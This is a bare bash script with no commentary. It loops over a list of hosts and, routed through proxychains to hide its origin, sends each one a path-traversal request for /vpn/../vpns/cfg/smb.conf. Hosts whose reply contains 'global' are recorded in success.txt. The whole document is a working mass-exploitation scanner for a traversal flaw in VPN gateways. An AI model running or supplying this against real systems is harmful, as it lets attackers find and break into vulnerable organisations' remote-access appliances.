while read p; do
  x=$(timeout 10 proxychains -q curl --connect-timeout 5 -m 10 -i -k https://$p/vpn/../vpns/cfg/smb.conf --path-as-is)&&(echo $x|grep -q global && echo $p >>success.txt)&
done <xaa
